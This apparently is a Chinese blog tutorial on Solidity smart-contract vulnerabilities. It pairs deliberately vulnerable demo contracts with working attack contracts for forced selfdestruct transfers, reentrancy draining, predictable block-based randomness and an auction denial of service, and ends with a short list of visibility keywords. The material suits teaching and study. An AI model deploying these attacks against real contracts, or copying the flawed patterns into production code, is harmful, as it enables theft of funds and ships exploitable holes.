        <content type="html"><![CDATA[<h2 id="这是我第一篇文章"><a href="#这是我第一篇文章" class="headerlink" title="这是我第一篇文章"></a>这是我第一篇文章</h2><div class="note default simple"><p>我的小标签 </p></div><h1 id="solidity漏洞"><a href="#solidity漏洞" class="headerlink" title="solidity漏洞"></a>solidity漏洞</h1><h3 id="1，自毁函数攻击"><a href="#1，自毁函数攻击" class="headerlink" title="1，自毁函数攻击"></a>1，自毁函数攻击</h3><p><strong>通过selfdestruce自会函数进行强制转账，导致合约中受到7ether，然后卡死</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract EtherGame&#123;#幸运七游戏：第七个传入以太币的人会得到前面的以太币</span><br><span class="line">    address public winner;</span><br><span class="line">    uint TARGET_AMOUNT=7 ether;</span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        require(msg.value==1 ether,&quot;you can only send 1 ether&quot;);</span><br><span class="line">        uint balances=address(this).balance;</span><br><span class="line">        require(balances&lt;=TARGET_AMOUNT,&quot;game is over&quot;);</span><br><span class="line">        if(balances==TARGET_AMOUNT)&#123;</span><br><span class="line">            winner=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender==winner,&quot;not pass&quot;);</span><br><span class="line">        (bool send,)=msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(send,&quot;failed&quot;);</span><br><span class="line">        winner=address(0);</span><br><span class="line">    &#125;</span><br><span class="line">    function getbalance()public view returns(uint)&#123;</span><br><span class="line">    return address(this).balance;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address  to)external&#123;</span><br><span class="line">            selfdestruct(payable(to));</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2，重入攻击"><a href="#2，重入攻击" class="headerlink" title="2，重入攻击"></a>2，重入攻击</h3><p><strong>该攻击利用fallback函数的触发来做到递归取款，一直会取以太只到取完。fallback触发条件为：1.收到以太 2.调用合约中不存在的函数时</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.6;#重入攻击只能在0.8.0版本以下</span><br><span class="line">contract Bank &#123;</span><br><span class="line"> mapping(address =&gt; uint) public balances; //账本，用来记录每一个用户的账户余额</span><br><span class="line"> //取款</span><br><span class="line"> function withdraw(uint _amount) external payable &#123;</span><br><span class="line">     //用户余额大于存款额，否侧错误</span><br><span class="line">     require (balances[msg.sender] &gt;= _amount,&quot;balance is insufficient&quot;);</span><br><span class="line">     //转账给用户</span><br><span class="line">     (bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">     //是否成功，不成功返回数据</span><br><span class="line">     require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">     //扣除转出去的钱</span><br><span class="line">     balances[msg.sender] -= _amount;</span><br><span class="line">     &#125;</span><br><span class="line">     //存款</span><br><span class="line">     function deposit() public payable &#123;</span><br><span class="line">          balances[msg.sender] += msg.value;//存款  [用户可使用]</span><br><span class="line">          &#125;//查看余额</span><br><span class="line">          function getBalance() external view returns (uint) &#123;</span><br><span class="line">              return address(this).balance;</span><br><span class="line">              &#125;</span><br><span class="line">              constructor() payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    //攻击目标</span><br><span class="line">    Bank public bank;</span><br><span class="line">    //参数为攻击目标的地址</span><br><span class="line">    constructor(address payable _address)payable &#123;</span><br><span class="line">        bank = Bank(_address);</span><br><span class="line">        &#125;</span><br><span class="line">        //2攻击</span><br><span class="line">        function attack() external payable &#123;</span><br><span class="line">            bank.deposit&#123;value: 1 ether&#125;();//先存再取出</span><br><span class="line">            bank.withdraw(1 ether);</span><br><span class="line">            &#125;</span><br><span class="line">            //回退</span><br><span class="line">            fallback() external payable &#123;</span><br><span class="line">                if (address(bank).balance &gt;= 1 ether) &#123;</span><br><span class="line">                    bank.withdraw(1 ether);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // 查看合同余额</span><br><span class="line">                    function getBalance() external view returns (uint) &#123;</span><br><span class="line">                        return address(this).balance;</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3，随机数攻击"><a href="#3，随机数攻击" class="headerlink" title="3，随机数攻击"></a>3，随机数攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract Random&#123;</span><br><span class="line">    function guess()public payable &#123;</span><br><span class="line">        bool result=_getRandom();</span><br><span class="line">        if(result)&#123;</span><br><span class="line">            address _to=msg.sender;</span><br><span class="line">         _to.call&#123;value:1 ether&#125;(&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function _getRandom()public view returns(bool)&#123;</span><br><span class="line">        uint random=uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)));</span><br><span class="line">        if(random%2==0)&#123;</span><br><span class="line">            return false;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;return true;&#125;</span><br><span class="line">           </span><br><span class="line">&#125;</span><br><span class="line">constructor()payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function attack(address _random)external payable&#123;</span><br><span class="line">        for(uint i=0;i&lt;1;i++)&#123;</span><br><span class="line">            if(payable(_random).balance&lt;1)&#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            if(uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)))%2!=0)&#123;</span><br><span class="line">                Random(_random).guess();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4，拒绝服务攻击"><a href="#4，拒绝服务攻击" class="headerlink" title="4，拒绝服务攻击"></a>4，拒绝服务攻击</h3><p><strong>利用合约无法收款的特性来攻击，当合约没用fallback函数与receive函数时合约就无法收到外部转账或者退钱，因此投标函数无法完整的向下执行，不会改变winner的地址，winner会被一直霸占</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract  Auction&#123;</span><br><span class="line">    address public winner;</span><br><span class="line">    uint public amount;</span><br><span class="line">    function bid()external payable&#123;</span><br><span class="line">        require(msg.value&gt;0,&quot;amount is too small&quot;);</span><br><span class="line">        require(msg.value&gt;amount,&quot;amount is too small&quot;);//如不符合要求则进行回退</span><br><span class="line">        payable(winner).transfer(amount);</span><br><span class="line">        winner=msg.sender;</span><br><span class="line">        amount=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address target,uint amount)external payable&#123;</span><br><span class="line">        Auction(payable (target)).bid&#123;value:amount&#125;();</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5，访问控制攻击"><a href="#5，访问控制攻击" class="headerlink" title="5，访问控制攻击"></a>5，访问控制攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public – 公共状态变量可以在内部访问，也可以通过消息访问。对于公共状态变量，将生成一个自动getter函数。</span><br><span class="line">internal – 内部状态变量只能从当前合约或其派生合约内访问。</span><br><span class="line">private – 私有状态变量只能从当前合约内部访问，派生合约内不能访问</span><br><span class="line">external — 外部状态变量只能在合约之外调用，不能被合约内的其他函数调用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity基础攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
